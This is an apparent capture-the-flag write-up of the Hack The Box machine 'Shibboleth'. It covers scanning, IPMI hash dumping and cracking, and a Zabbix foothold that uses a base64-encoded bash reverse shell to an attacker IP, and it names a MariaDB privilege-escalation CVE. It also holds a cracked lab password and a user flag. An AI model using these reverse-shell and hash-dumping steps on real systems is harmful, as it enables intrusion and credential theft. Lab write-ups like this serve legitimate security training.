@@ -1,0 +1,277 @@
+<!doctype html><html lang=es><head><title>Shibboleth | 7Rocky</title><meta charset=utf-8><meta http-equiv=x-ua-compatible content="IE=edge,chrome=1"><meta name=viewport content="width=device-width,minimum-scale=1"><meta name=description content="Hack The Box. Linux. Medium machine. This machine has a vulnerable IPMI service where we can find a password that is reused for a Zabbix control panel. Here we can enter and get access to the machine. Next, we find a vulnerable version for MariaDB which leads to RCE as root. Good enumeration and pentesting methodology are needed in order to comprimise this machine"><meta itemprop=description content="Hack The Box. Linux. Medium machine. This machine has a vulnerable IPMI service where we can find a password that is reused for a Zabbix control panel. Here we can enter and get access to the machine. Next, we find a vulnerable version for MariaDB which leads to RCE as root. Good enumeration and pentesting methodology are needed in order to comprimise this machine"><meta name=twitter:description content="Hack The Box. Linux. Medium machine. This machine has a vulnerable IPMI service where we can find a password that is reused for a Zabbix control panel. Here we can enter and get access to the machine. Next, we find a vulnerable version for MariaDB which leads to RCE as root. Good enumeration and pentesting methodology are needed in order to comprimise this machine"><meta property="og:description" content="Hack The Box. Linux. Medium machine. This machine has a vulnerable IPMI service where we can find a password that is reused for a Zabbix control panel. Here we can enter and get access to the machine. Next, we find a vulnerable version for MariaDB which leads to RCE as root. Good enumeration and pentesting methodology are needed in order to comprimise this machine"><meta name=robots content="index, follow"><meta name=author content="7Rocky"><meta name=twitter:author content="7Rocky"><meta property="og:author" content="7Rocky"><meta name=image content="https://7rocky.github.io/images/HTB/Shibboleth/Shibboleth.png"><meta name=twitter:image content="https://7rocky.github.io/images/HTB/Shibboleth/Shibboleth.png"><meta property="og:image" content="https://7rocky.github.io/images/HTB/Shibboleth/Shibboleth.png"><meta property="og:site_name" content="7Rocky"><meta itemprop=name content="Shibboleth"><meta property="og:title" content="Shibboleth"><meta property="og:url" content="https://7rocky.github.io/en/htb/shibboleth/"><meta itemprop=keywords content="cve,password-reuse,rce,hash-cracking,"><script async src="https://www.googletagmanager.com/gtag/js?id=G-Z1HQGH3M4D"></script>
+<script>var doNotTrack=!1;if(!doNotTrack){window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag("js",new Date),gtag("config","G-Z1HQGH3M4D",{anonymize_ip:!1})}</script><link rel="shortcut icon" href=/images/favicon.ico type=image/x-icon><link href=/css/style.css rel=stylesheet><link href=/css/monokai-sublime.min.css rel=stylesheet><link href=/css/code.css rel=stylesheet><link href=/css/main.css rel=stylesheet><script src=/js/highlight.min.js></script>
+<script>hljs.configure({ignoreUnescapedHTML:!0}),hljs.highlightAll()</script><script src=//mozilla.github.io/pdf.js/build/pdf.js></script>
+<script src="//cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.1/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
+<script type=text/x-mathjax-config>MathJax.Hub.Config({messageStyle:'none',tex2jax:{displayMath:[['$$','$$']],inlineMath:[['$','$']],processEnvironments:!0,processEscapes:!0,skipTags:['noscript','pre','script','style','textarea'],TeX:{equationNumbers:{autoNumber:'AMS'},extensions:['AMSmath.js','AMSsymbols.js']}}})</script><script src=/js/main.js></script><div style=display:none>$
+\newcommand{\e}{e}
+\newcommand{\N}[1][]{\mathbb{N}^{#1}}
+\newcommand{\Q}[1][]{\mathbb{Q}^{#1}}
+\newcommand{\R}[1][]{\mathbb{R}^{#1}}
+\newcommand{\Z}[1][]{\mathbb{Z}^{#1}}
+\newcommand{\C}[1][]{\mathbb{C}^{#1}}
+\newcommand{\dx}{\,\mathrm{d}x}
+\newcommand{\dy}{\,\mathrm{d}y}
+\newcommand{\dz}{\,\mathrm{d}z}
+\newcommand{\dt}{\,\mathrm{d}t}
+\newcommand{\divides}{\, | \,}
+\newcommand{\st}{\; | \;}
+\renewcommand{\geq}{\geqslant}
+\renewcommand{\leq}{\leqslant}
+\renewcommand{\i}{\mathrm{i}}
+\newcommand{\rank}{\mathop{\mathrm{rank}}}
+\newcommand{\tr}{\mathop{\mathrm{tr}}}
+\newcommand{\charField}{\mathop{\mathrm{char}}}
+\newcommand{\Image}{\mathop{\mathrm{Im}}}
+$</div></head><body class="ma0 production"><header style=position:sticky;top:0;z-index:9><div class=bg-black><nav class=ph4-ns role=navigation><div class="flex-l justify-between items-center center"><a class="f3 fw2 hover-white no-underline white-90 dib" href=/en/ title=7Rocky>7Rocky</a><div class="flex-l items-center"><a class="link-transition lang link dib z-999 pt3 pt0-l mr3" href=/htb/shibboleth/ title=es><img alt=es height=30px src=/images/es.png style="border:4px solid#000;border-radius:100%" width=30px></a>
+<a class="link-transition lang link dib z-999 pt3 pt0-l" href title=en><img alt=en height=30px src=/images/en.png width=30px></a><ul class="pl0 ml3 mr3"><li class="list f5 f4-ns fw4 dib pr2 pl2"><a class="hover-white no-underline white-90" href=/en/ctf/ title=CTF>CTF</a></li><li class="list f5 f4-ns fw4 dib pr2 pl2"><a class="hover-white no-underline white-90" href=/en/htb/ title=HTB>HTB</a></li><li class="list f5 f4-ns fw4 dib pr2 pl2"><a class="hover-white no-underline white-90" href=/en/imc/ title=IMC>IMC</a></li></ul><a href=https://www.linkedin.com/in/roberto-gesteira-minarro/ target=_blank class="link-transition linkedin link dib z-999 pt3 pt0-l mr1" title="LinkedIn link" rel=noopener aria-label="follow on LinkedIn——Opens in a new window"><svg height="32" style="enable-background:new 0 0 65 65" viewBox="0 0 65 65" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M50.837 48.137V36.425c0-6.275-3.35-9.195-7.816-9.195-3.604.0-5.219 1.983-6.119 3.374V27.71h-6.79c.09 1.917.0 20.427.0 20.427h6.79V36.729c0-.609.044-1.219.224-1.655.49-1.22 1.607-2.483 3.482-2.483 2.458.0 3.44 1.873 3.44 4.618v10.929H50.837zM22.959 24.922c2.367.0 3.842-1.57 3.842-3.531-.044-2.003-1.475-3.528-3.797-3.528s-3.841 1.524-3.841 3.528c0 1.961 1.474 3.531 3.753 3.531H22.959zM34 64C17.432 64 4 50.568 4 34 4 17.431 17.432 4 34 4s30 13.431 30 30c0 16.568-13.432 30-30 30zM26.354 48.137V27.71h-6.789v20.427h6.789z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg><span class=new-window><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></span></a><a href=https://github.com/7Rocky target=_blank class="link-transition github link dib z-999 pt3 pt0-l mr1" title="GitHub link" rel=noopener aria-label="follow on GitHub——Opens in a new window"><svg height="32" style="enable-background:new 0 0 512 512" viewBox="0 0 512 512" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M256 32C132.3 32 32 134.8 32 261.7c0 101.5 64.2 187.5 153.2 217.9 11.2 2.1 15.3-5 15.3-11.1.0-5.5-.2-19.9-.3-39.1-62.3 13.9-75.5-30.8-75.5-30.8-10.2-26.5-24.9-33.6-24.9-33.6-20.3-14.3 1.5-14 1.5-14 22.5 1.6 34.3 23.7 34.3 23.7 20 35.1 52.4 25 65.2 19.1 2-14.8 7.8-25 14.2-30.7-49.7-5.8-102-25.5-102-113.5.0-25.1 8.7-45.6 23-61.6-2.3-5.8-10-29.2 2.2-60.8.0.0 18.8-6.2 61.6 23.5 17.9-5.1 37-7.6 56.1-7.7 19 .1 38.2 2.6 56.1 7.7 42.8-29.7 61.5-23.5 61.5-23.5 12.2 31.6 4.5 55 2.2 60.8 14.3 16.1 23 36.6 23 61.6.0 88.2-52.4 107.6-102.3 113.3 8 7.1 15.2 21.1 15.2 42.5.0 30.7-.3 55.5-.3 63 0 6.1 4 13.3 15.4 11C415.9 449.1 480 363.1 480 261.7 480 134.8 379.7 32 256 32z"/></svg><span class=new-window><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></span></a></div></div></nav></div></header><main class=pb7 role=main><article class="flex-l flex-wrap justify-between mw8 center ph3"><header class="mt4 w-100"><aside aria-label=aside class="instapaper_ignoref b helvetica tracked">HTB</aside><div id=sharing class=mt3><a aria-label="share on Facebook" class="facebook no-underline" href="https://www.facebook.com/sharer.php?u=https://7rocky.github.io/en/htb/shibboleth/" title="share on Facebook"><svg height="32" style="enable-background:new 0 0 67 67" viewBox="0 0 67 67" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M28.765 50.32h6.744V33.998h4.499l.596-5.624h-5.095l.007-2.816c0-1.466.14-2.253 2.244-2.253h2.812V17.68h-4.5c-5.405.0-7.307 2.729-7.307 7.317v3.377h-3.369v5.625h3.369V50.32zM33 64C16.432 64 3 50.569 3 34S16.432 4 33 4s30 13.431 30 30S49.568 64 33 64z" style="fill-rule:evenodd;clip-rule:evenodd"/></svg></a><a aria-label="share on Twitter" class="twitter no-underline" href="https://twitter.com/share?url=https://7rocky.github.io/en/htb/shibboleth/&text=Shibboleth" title="share on Twitter"><svg height="32" style="enable-background:new 0 0 67 67" viewBox="0 0 67 67" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M37.167 22.283c-2.619.953-4.274 3.411-4.086 6.101l.063 1.038-1.048-.127c-3.813-.487-7.145-2.139-9.974-4.915l-1.383-1.377-.356 1.017c-.754 2.267-.272 4.661 1.299 6.271.838.89.649 1.017-.796.487-.503-.169-.943-.296-.985-.233-.146.149.356 2.076.754 2.839.545 1.06 1.655 2.097 2.871 2.712l1.027.487-1.215.021c-1.173.0-1.215.021-1.089.467.419 1.377 2.074 2.839 3.918 3.475l1.299.444-1.131.678c-1.676.976-3.646 1.526-5.616 1.568C19.775 43.256 19 43.341 19 43.405c0 .211 2.557 1.397 4.044 1.864 4.463 1.377 9.765.783 13.746-1.568 2.829-1.673 5.657-5 6.978-8.221.713-1.716 1.425-4.851 1.425-6.354.0-.975.063-1.102 1.236-2.267.692-.678 1.341-1.419 1.467-1.631.21-.403.188-.403-.88-.043-1.781.636-2.033.551-1.152-.402.649-.678 1.425-1.907 1.425-2.267.0-.063-.314.042-.671.233-.377.212-1.215.53-1.844.72l-1.131.361-1.027-.7c-.566-.381-1.361-.805-1.781-.932C39.766 21.902 38.131 21.944 37.167 22.283zM33 64C16.432 64 3 50.569 3 34S16.432 4 33 4s30 13.431 30 30S49.568 64 33 64z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></a><a aria-label="share on LinkedIn" class="linkedin no-underline" href="https://www.linkedin.com/shareArticle?mini=true&url=https://7rocky.github.io/en/htb/shibboleth/&title=Shibboleth" title="share on LinkedIn"><svg height="32" style="enable-background:new 0 0 65 65" viewBox="0 0 65 65" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M50.837 48.137V36.425c0-6.275-3.35-9.195-7.816-9.195-3.604.0-5.219 1.983-6.119 3.374V27.71h-6.79c.09 1.917.0 20.427.0 20.427h6.79V36.729c0-.609.044-1.219.224-1.655.49-1.22 1.607-2.483 3.482-2.483 2.458.0 3.44 1.873 3.44 4.618v10.929H50.837zM22.959 24.922c2.367.0 3.842-1.57 3.842-3.531-.044-2.003-1.475-3.528-3.797-3.528s-3.841 1.524-3.841 3.528c0 1.961 1.474 3.531 3.753 3.531H22.959zM34 64C17.432 64 4 50.568 4 34 4 17.431 17.432 4 34 4s30 13.431 30 30c0 16.568-13.432 30-30 30zM26.354 48.137V27.71h-6.789v20.427h6.789z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></a></div><h1 class="f1 mt3 mb1">Shibboleth</h1><time class="f6 mv4 dib tracked" datetime=2022-04-02T00:00:00+01:00>02 / 04 / 2022</time></header><div class=htb-image><img alt=Shibboleth src=/images/HTB/Shibboleth/Shibboleth.png></div><ul class="nested-links tags"><li class=list><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href=/en/tags/cve title=CVE>CVE</a></li><li class=list><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href=/en/tags/password-reuse title="Password reuse">Password reuse</a></li><li class=list><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href=/en/tags/rce title="Remote Code Execution">Remote Code Execution</a></li><li class=list><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href=/en/tags/hash-cracking title="Password hash cracking">Password hash cracking</a></li></ul><aside aria-label=aside class="w-20-l mt6-l aside-mobile"><div class="bg-card pa3 nested-list-reset nested-copy-line-height nested-links" style=position:sticky;top:5rem><p class="f5 b mb3">Contents of this write-up</p><nav id=TableOfContents><ul><li><a href=#port-scanning>Port scanning</a></li><li><a href=#web-enumeration>Web enumeration</a></li><li><a href=#udp-enumeration>UDP enumeration</a></li><li><a href=#ipmi-exploitation>IPMI exploitation</a></li><li><a href=#foothold-on-the-machine>Foothold on the machine</a></li><li><a href=#system-enumeration>System enumeration</a></li><li><a href=#privilege-escalation>Privilege escalation</a></li></ul></nav></div></aside><div class="nested-copy-line-height lh-copy serif f4 nested-links nested-img pr4-l w-80-l"><ul><li><strong>OS</strong>: Linux</li><li><strong>Difficulty</strong>: Medium</li><li><strong>IP Address</strong>: 10.10.11.124</li><li><strong>Release</strong>: 13 / 11 / 2021</li></ul><h2 id=port-scanning>Port scanning</h2><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-plaintext data-lang=plaintext><span style=display:flex><span># Nmap 7.92 scan initiated as: nmap -sC -sV -o nmap/targeted 10.10.11.124 -p 80
+</span></span><span style=display:flex><span>Nmap scan report for 10.10.11.124
+</span></span><span style=display:flex><span>Host is up (0.12s latency).
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>PORT   STATE SERVICE VERSION
+</span></span><span style=display:flex><span>80/tcp open  http    Apache httpd 2.4.41
+</span></span><span style=display:flex><span>|_http-title: FlexStart Bootstrap Template - Index
+</span></span><span style=display:flex><span>|_http-server-header: Apache/2.4.41 (Ubuntu)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+</span></span><span style=display:flex><span># Nmap done -- 1 IP address (1 host up) scanned in 11.04 seconds
+</span></span></code></pre></div><p>This machine has port 80 (HTTP) open.</p><h2 id=web-enumeration>Web enumeration</h2><p>If we go to <code>http://10.10.11.124</code>, the server will redirect to <code>http://shibboleth.htb</code>. After setting the domain in <code>/etc/hosts</code> we can access and view this site:</p><p><img src=/images/HTB/Shibboleth/Shibboleth-index.png alt="Shibboleth index"></p><p>We can apply som fuzzing with <code>ffuf</code> to enumerate some routes:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-cyan>$</span> <span class=code-dark-green>ffuf</span> -w $WORDLISTS/dirbuster/directory-list-2.3-medium.txt -u http://shibboleth.htb/FUZZ -e .php,.html  
+<span class=code-dark-green>index.html              [Status: 200, Size: 59474, Words: 17014, Lines: 1324, Duration: 109ms]
+blog.html               [Status: 200, Size: 19196, Words: 5073, Lines: 426, Duration: 130ms]</span>
+<span class=code-dark-blue>assets                  [Status: 301, Size: 317, Words: 20, Lines: 10, Duration: 107ms]
+forms                   [Status: 301, Size: 316, Words: 20, Lines: 10, Duration: 123ms]</span>
+<span class=code-dark-yellow>.html                   [Status: 403, Size: 279, Words: 20, Lines: 10, Duration: 98ms]
+.php                    [Status: 403, Size: 279, Words: 20, Lines: 10, Duration: 98ms]</span>
+<span class=code-dark-green>                        [Status: 200, Size: 59474, Words: 17014, Lines: 1324, Duration: 97ms]</span>
+<span class=code-dark-yellow>server-status           [Status: 403, Size: 279, Words: 20, Lines: 10, Duration: 88ms]</span>
+</code></pre></div><p>And also some subdomains:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-cyan>$</span> <span class=code-dark-green>ffuf</span> -w $WORDLISTS/dirbuster/directory-list-lowercase-2.3-medium.txt -u http://10.10.11.124 -H <span class=code-dark-yellow>'Host: FUZZ.shibboleth.htb'</span> -fc 302  
+<span class=code-dark-green>monitor                 [Status: 200, Size: 3689, Words: 192, Lines: 30, Duration: 121ms]
+monitoring              [Status: 200, Size: 3689, Words: 192, Lines: 30, Duration: 107ms]
+zabbix                  [Status: 200, Size: 3689, Words: 192, Lines: 30, Duration: 457ms]</span>
+</code></pre></div><p>All subdomains are the same website, a Zabbix login form:</p><p><img src=/images/HTB/Shibboleth/Shibboleth-zabbix.png alt="Shibboleth Zabbix"></p><p>But we can&rsquo;t do anything here yet, since we do not have credentials and there is no clear vulnerability.</p><h2 id=udp-enumeration>UDP enumeration</h2><p>At this point, we don&rsquo;t have anymore to investigate, so let&rsquo;s run a UDP port scan:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-red>#</span> <span class=code-dark-green>nmap</span> -sU --top-ports 100 -n -Pn -vv 10.10.11.124
+Password:
+Starting Nmap 7.92 ( https://nmap.org )
+Initiating UDP Scan
+Scanning 10.10.11.124 [100 ports]
+Increasing send delay for 10.10.11.124 from 0 to 50 due to max_successful_tryno increase to 4
+Increasing send delay for 10.10.11.124 from 50 to 100 due to max_successful_tryno increase to 5
+Increasing send delay for 10.10.11.124 from 100 to 200 due to max_successful_tryno increase to 6
+Increasing send delay for 10.10.11.124 from 200 to 400 due to 11 out of 12 dropped probes since last increase.  
+Increasing send delay for 10.10.11.124 from 400 to 800 due to 11 out of 11 dropped probes since last increase.
+Discovered open port 623/udp on 10.10.11.124
+Completed UDP Scan, 102.42s elapsed (100 total ports)
+Nmap scan report for 10.10.11.124
+Host is up, received user-set (0.096s latency).
+Scannedfor 102s
+Not shown: 98 closed udp ports (port-unreach)
+PORT    STATE         SERVICE     REASON
+138/udp open|filtered netbios-dgm no-response
+623/udp open          asf-rmcp    udp-response ttl 63
+
+Nmap done: 1 IP address (1 host up) scanned in 102.46 seconds
+           Raw packets sent: 246 (13.189KB) | Rcvd: 110 (9.315KB)
+</code></pre></div><p>And we discover that port 623 (UDP) is open, which stands for IPMI.</p><h2 id=ipmi-exploitation>IPMI exploitation</h2><p><a href=https://book.hacktricks.xyz/pentesting/623-udp-ipmi>HackTricks</a> has some information regarding this service. Most of the recognising and exploitation techniques are covered by Metasploit Framework, so let&rsquo;s start.</p><p>First, we will check the version of IPMI:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-cyan>$</span> <span class=code-dark-green>msfconsole</span> -q
+<span class=mtku>msf6</span> &gt; use auxiliary/scanner/ipmi/ipmi_version
+<span class=mtku>msf6</span> auxiliary(<span class=code-red>scanner/ipmi/ipmi_version</span>) &gt; show options
+
+Module options (auxiliary/scanner/ipmi/ipmi_version):
+
+   Name       Current Setting  Required  Description
+   ----       ---------------  --------  -----------
+   BATCHSIZE  256              yes       The number of hosts to probe in each set
+   RHOSTS                      yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit
+   RPORT      623              yes       The target port (UDP)
+   THREADS    10               yes       The number of concurrent threads
+
+<span class=mtku>msf6</span> auxiliary(<span class=code-red>scanner/ipmi/ipmi_version</span>) &gt; set RHOSTS 10.10.11.124
+RHOSTS =&gt; 10.10.11.124
+<span class=mtku>msf6</span> auxiliary(<span class=code-red>scanner/ipmi/ipmi_version</span>) &gt; run
+
+<span class=code-blue>[*]</span> Sending IPMI requests to 10.10.11.124-&gt;10.10.11.124 (1 hosts)
+<span class=code-green>[+]</span> 10.10.11.124:623 - IPMI - IPMI-2.0 UserAuth(auth_msg, auth_user, non_null_user) PassAuth(password, md5, md2, null) Level(1.5, 2.0)  
+<span class=code-blue>[*]</span> Scanned 1 of 1 hosts (100% complete)
+<span class=code-blue>[*]</span> Auxiliary module execution completed
+</code></pre></div><p>There is an exploit for IPMI that allows us to dump password hashes for common usernames:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=mtku>msf6</span> auxiliary(<span class=code-red>scanner/ipmi/ipmi_version</span>) &gt; use auxiliary/scanner/ipmi/ipmi_dumphashes
+<span class=mtku>msf6</span> auxiliary(<span class=code-red>scanner/ipmi/ipmi_dumphashes</span>) &gt; set RHOSTS 10.10.11.124
+RHOSTS =&gt; 10.10.11.124
+<span class=mtku>msf6</span> auxiliary(<span class=code-red>scanner/ipmi/ipmi_dumphashes</span>) &gt; set OUTPUT_JOHN_FILE ./hash
+OUTPUT_JOHN_FILE =&gt; ./hash
+<span class=mtku>msf6</span> auxiliary(<span class=code-red>scanner/ipmi/ipmi_dumphashes</span>) &gt; run
+
+<span class=code-green>[+]</span> 10.10.11.124:623 - IPMI - Hash found: Administrator:0e60be0702060000aca06cad807b13048ed6f894c5c144e3345d9d440c8d5575c76919f4198e2e1ba123456789abcdefa123456789abcdef140d41646d696e6973747261746f72:27d7c9a280380fba72efc55babb4fdf216fdfc87  
+<span class=code-blue>[*]</span> Scanned 1 of 1 hosts (100% complete)
+<span class=code-blue>[*]</span> Auxiliary module execution completed
+</code></pre></div><p>And there we have it, now we can crack the hash with <code>john</code> and <code>rockyou.txt</code>:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-cyan>$</span> <span class=code-dark-green>cat</span> <span class=mtku>hash</span>
+10.10.11.124 Administrator:$rakp$3aab2bf5020a000061799fc2151cd71322e3e5a0bd03da5efae02e1e1f6524e75b9ecc9dca02d6a4a123456789abcdefa123456789abcdef140d41646d696e6973747261746f72$81a9602adaa1d61f8c24cfbf1ef0c03df095b945  
+
+<span class=code-cyan>$</span> <span class=code-dark-green>john</span> --wordlist=$WORDLISTS/rockyou.txt <span class=mtku>hash</span>
+Using default input encoding: UTF-8
+Loaded 1 password hash (RAKP, IPMI 2.0 RAKP (RMCP+) [HMAC-SHA1 128/128 ASIMD 4x])
+Press 'q' or Ctrl-C to abort, almost any other key for status
+<span class=code-dark-red>ilovepumkinpie1</span>  (<span class=code-dark-red>10.10.11.124 Administrator</span>)
+1g 0:00:00:01 DONE 0.5154g/s 3812Kp/s 3812Kc/s 3812KC/s iloveqmc..ilovepatri
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed.
+</code></pre></div><p>And there&rsquo;s the password.</p><h2 id=foothold-on-the-machine>Foothold on the machine</h2><p>Now we can access Zabbix using credentials <code>Administrator:ilovepumkinpie1</code>:</p><p><img src=/images/HTB/Shibboleth/Shibboleth-zabbix-admin.png alt="Shibboleth Zabbix"></p><p>The way to exploit Zabbix is to create a new item (going to &ldquo;Configuration&rdquo;, selecting &ldquo;Hosts&rdquo; and clicking in &ldquo;Create item&rdquo;).</p><p>There, we will see a form like the one below, and we must enter a name and a key, where we will put a command that will be executed every minute. For instance, a reverse shell:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-plaintext data-lang=plaintext><span style=display:flex><span>system.run[echo YmFzaCAgLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTcuNDQvNDQ0NCAwPiYx | base64 -d | bash,nowait]
+</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-cyan>$</span> <span class=code-dark-green>echo</span> -n <span class=code-dark-yellow>'bash  -i >& /dev/tcp/10.10.17.44/4444 0>&1'</span> | <span class=code-dark-green>base64</span>  
+YmFzaCAgLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTcuNDQvNDQ0NCAwPiYx
+</code></pre></div><p><img src=/images/HTB/Shibboleth/Shibboleth-zabbix-rev.png alt="Shibboleth Zabbix"></p><p>And we will see that the item is created:</p><p><img src=/images/HTB/Shibboleth/Shibboleth-zabbix-rev-setup.png alt="Shibboleth Zabbix"></p><p>Now we must wait some seconds until the connection hits <code>nc</code>:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-cyan>$</span> <span class=code-dark-green>nc</span> -nlvp 4444
+Ncat: Version 7.92 ( https://nmap.org/ncat )
+Ncat: Listening on :::4444
+Ncat: Listening on 0.0.0.0:4444
+Ncat: Connection from 10.10.11.124.
+Ncat: Connection from 10.10.11.124:44284.
+bash: cannot set terminal process group (859): Inappropriate ioctl for device  
+bash: no job control in this shell
+zabbix@shibboleth:/$ script /dev/null -c bash
+script /dev/null -c bash
+Script started, file is /dev/null
+zabbix@shibboleth:/$ ^Z
+zsh: suspended  ncat -nlvp 4444
+
+<span class=code-cyan>$</span> <span class=code-dark-green>stty</span> raw -echo; <span class=code-dark-green>fg</span>
+[1]  + continued  ncat -nlvp 4444
+                                 reset xterm
+zabbix@shibboleth:/$ export TERM=xterm
+zabbix@shibboleth:/$ export SHELL=bash
+zabbix@shibboleth:/$ stty rows 50 columns 158
+</code></pre></div><h2 id=system-enumeration>System enumeration</h2><p>We see that there is a user called <code>ipmi-svc</code> and that it owns the <code>user.txt</code> flag:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight>zabbix@shibboleth:/$ ls /home
+ipmi-svc
+zabbix@shibboleth:/$ find / -name user.txt 2>/dev/null  
+/home/ipmi-svc/user.txt
+zabbix@shibboleth:/$ cat /home/ipmi-svc/user.txt
+cat: /home/ipmi-svc/user.txt: Permission denied
+</code></pre></div><p>We can switch to that user reusing the password found before (<code>ilovepumkinpie1</code>):</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight>zabbix@shibboleth:/$ su ipmi-svc
+Password:
+ipmi-svc@shibboleth:/$ cd
+ipmi-svc@shibboleth:~$ cat user.txt  
+bc3f4542527b43d71e100c426b445674
+</code></pre></div><p>Its home directory shows a <code>.mysql_history</code> file, that is not commonly seen in other boxes:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight>ipmi-svc@shibboleth:~$ ls -la
+total 32
+drwxr-xr-x 3 ipmi-svc ipmi-svc 4096 Oct 16 12:23 <span class=code-blue>.</span>
+drwxr-xr-x 3 root     root     4096 Oct 16 12:24 <span class=code-blue>..</span>
+lrwxrwxrwx 1 ipmi-svc ipmi-svc    9 Apr 27  2021 <span class=code-cyan>.bash_history</span> -&gt; <span class=code-yellow>/dev/null</span>
+-rw-r--r-- 1 ipmi-svc ipmi-svc  220 Apr 24  2021 .bash_logout
+-rw-r--r-- 1 ipmi-svc ipmi-svc 3771 Apr 24  2021 .bashrc
+drwx------ 2 ipmi-svc ipmi-svc 4096 Apr 27  2021 <span class=code-blue>.cache</span>
+lrwxrwxrwx 1 ipmi-svc ipmi-svc    9 Apr 28  2021 <span class=code-cyan>.mysql_history</span> -&gt; <span class=code-yellow>/dev/null</span>  
+-rw-r--r-- 1 ipmi-svc ipmi-svc  807 Apr 24  2021 .profile
+-rw-r----- 1 ipmi-svc ipmi-svc   33 Apr 13 05:29 user.txt
+-rw-rw-r-- 1 ipmi-svc ipmi-svc   22 Apr 24  2021 .vimrc
+</code></pre></div><p>This is the version of MySQL (MariaDB):</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight>ipmi-svc@shibboleth:~$ mysql --version
+mysql  Ver 15.1 Distrib 10.3.25-MariaDB, for debian-linux-gnu (x86_64) using readline 5.2  
+</code></pre></div><h2 id=privilege-escalation>Privilege escalation</h2><p>If we do a bit of research, we will find <a href=https://github.com/Al1ex/CVE-2021-27928>CVE-2021-27928</a>, which leads to Remote Code Execution (RCE) as <code>root</code> because we can set a malicious shared library to be used by MariaDB.</p><p>To exploit MariaDB we need a valid user. We can search for configuration files that Zabbix needs:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight>ipmi-svc@shibboleth:~$ find / -name zabbix\* -type f 2>/dev/null | grep -v sys  
+/var/lib/dpkg/info/zabbix-frontend-php.md5sums
+/var/lib/dpkg/info/zabbix-agent.md5sums
+/var/lib/dpkg/info/zabbix-agent.postrm
+/var/lib/dpkg/info/zabbix-release.md5sums
+/var/lib/dpkg/info/zabbix-release.conffiles
+/var/lib/dpkg/info/zabbix-server-mysql.list
